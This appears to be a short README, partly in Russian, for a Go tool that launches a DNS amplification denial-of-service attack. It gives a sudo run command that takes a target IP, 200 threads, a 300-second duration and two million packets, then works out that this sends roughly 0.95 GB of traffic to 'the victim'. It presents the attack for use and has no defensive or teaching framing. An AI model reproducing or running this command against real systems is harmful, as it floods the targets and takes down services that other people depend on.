    ╔═══════════════════════════╗
    ║   ┏━┓╻ ╻╺┓ ┏━┓┏━╸┏━┓╺┓ 	║	
	║	┗━┓┃╻┃ ┃ ┏━┛┣╸ ┏━┛ ┃ 	║
	║	┗━┛┗┻┛╺┻╸┗━╸╹  ┗━╸╺┻╸   ║
    ║     DNS Amplification     ║
    ╚═══════════════════════════╝

    Script for amplification DOS attack

# Для 1 ГБ трафика к жертве:
```bash
sudo go run main.go -target {Target IP} -threads 200 -duration 300 -count 2000000
```

# Расчет:
2,000,000 × 500 байт = 1,000,000,000 байт ≈ 954 МБ ≈ 0.95 ГБ
